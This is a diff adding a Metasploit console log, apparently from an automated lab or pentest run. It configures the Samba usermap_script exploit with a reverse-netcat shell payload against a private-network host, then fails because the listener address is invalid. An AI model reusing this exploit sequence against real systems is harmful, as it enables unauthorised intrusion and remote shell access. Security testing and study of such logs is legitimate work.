@@ -1,0 +1,21 @@
+[1m[34m[*][0m Spooling to file /home/kali/forcevector/logs/sessions/msfconsole_transcript_192.168.139.128_20260710_065536.txt...
+resource (/tmp/tmpwwpmwy75.rc)> setg SessionLogging true
+[0mSession logging enabled.
+SessionLogging => true
+resource (/tmp/tmpwwpmwy75.rc)> setg ConsoleLogging true
+[0mConsole logging is now enabled.
+ConsoleLogging => true
+resource (/tmp/tmpwwpmwy75.rc)> setg ExitOnSession false
+[0mExitOnSession => false
+resource (/tmp/tmpwwpmwy75.rc)> use exploit/multi/samba/usermap_script
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/reverse_netcat
+resource (/tmp/tmpwwpmwy75.rc)> set RHOST 192.168.139.128
+[0mRHOST => 192.168.139.128
+resource (/tmp/tmpwwpmwy75.rc)> set RPORT 139
+[0mRPORT => 139
+resource (/tmp/tmpwwpmwy75.rc)> set LHOST 192.168
+[0mLHOST => 192.168
+[?1034h[4mmsf[0m exploit([1m[31mmulti/samba/usermap_script[0m) [0m> exploit
+[0m[1m[31m[-][0m 192.168.139.128:139 - Msf::OptionValidateError One or more options failed to validate: LHOST.
+[4mmsf[0m exploit([1m[31mmulti/samba/usermap_script[0m) [0m> exit
+[0m
